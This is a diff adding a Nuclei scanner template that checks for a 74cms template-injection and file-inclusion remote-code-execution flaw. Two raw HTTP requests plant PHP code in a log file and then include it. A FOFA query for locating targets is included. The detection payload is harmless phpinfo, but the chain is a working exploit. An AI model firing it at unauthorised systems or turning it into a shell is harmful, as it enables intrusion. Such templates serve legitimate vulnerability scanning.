@@ -1,0 +1,68 @@
+id: 74cms-Template-Injection-rce
+info:
+  name: 骑士cms模板注入_文件包含_rce
+  author: wjlin0
+  severity: high
+  description: 74cms assign_resume_tpl 函数因为过滤不严格，导致了模板注入，可以进行远程命令执行
+  reference:
+    - https://www.wangan.com/p/7fyg8ka5a6f81cb6
+    - https://cloud.tencent.com/developer/article/1856739
+  tags: 74cms,rce,getshell
+  metadata:
+    fofa-query: 'app="骑士-74CMS"'
+
+http:
+  - raw:
+      - |-
+        POST /index.php?m=home&a=assign_resume_tpl HTTP/1.1
+        Host: {{Hostname}}
+        sec-ch-ua: "Chromium";v="107", "Not=A?Brand";v="24"
+        sec-ch-ua-mobile: ?0
+        sec-ch-ua-platform: "Windows"
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Sec-Fetch-Site: none
+        Sec-Fetch-Mode: navigate
+        Sec-Fetch-User: ?1
+        Sec-Fetch-Dest: document
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 45
+
+        variable=1&tpl=<?php phpinfo(); echo md5("0694445338fceed590ea91addd68e9ff");ob_flush();?>
+      - |-
+        POST /index.php?m=home&a=assign_resume_tpl HTTP/1.1
+        Host: {{Hostname}}
+        sec-ch-ua: "Chromium";v="107", "Not=A?Brand";v="24"
+        sec-ch-ua-mobile: ?0
+        sec-ch-ua-platform: "Windows"
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Sec-Fetch-Site: none
+        Sec-Fetch-Mode: navigate
+        Sec-Fetch-User: ?1
+        Sec-Fetch-Dest: document
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 50
+
+        variable=1&tpl=data/Runtime/Logs/Home/{{replace(date_time("%Y"), "20", "")}}_{{date_time("%M_%D",unix_time())}}.log
+
+    matchers-condition: and
+    matchers:
+      - type: word 
+        part: body
+        words:
+          - PHP Version
+          - d64b6bfed17d3e6e34822cd7c7c44f42
+        condition: and
+      - type: status
+        status:
+          - 200
+# digest: 490a0046304402204276018cd6462b13b2166f1c1720c495c94ba407bd4d28d0672bdf3df3409596022026c0ddae75025d1a64c0a074d3da8bfbec46e4d53720774a5395a807efc3208e:9d8cf424f0e932381bf27cf1e926b867
